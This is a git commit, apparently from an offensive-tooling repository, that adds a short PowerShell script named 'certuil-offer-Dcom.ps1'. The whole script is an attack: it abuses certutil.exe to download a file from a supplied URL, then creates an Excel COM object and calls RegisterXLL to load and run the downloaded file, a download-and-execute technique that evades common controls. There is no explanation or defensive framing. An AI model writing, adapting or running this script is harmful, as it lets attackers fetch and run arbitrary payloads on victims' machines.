9ca5f76db5ca8fb84a4a4e4313d7f59653ad7d3c
李木-Limu <58651039+dnsil@users.noreply.github.com>
2021-01-03 19:04:08 +0800

    Add files via upload

---
+++ certuil-offer-Dcom.ps1
@@ -0,0 +1,18 @@
+﻿    
+    param(
+    
+         $path,
+         $DCOM,
+         $u
+
+
+               
+    )
+    
+   
+     
+    certutil.exe -urlcache -split -f -$u  $path
+     
+    $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
+     
+    $excel.RegisterXLL($path)
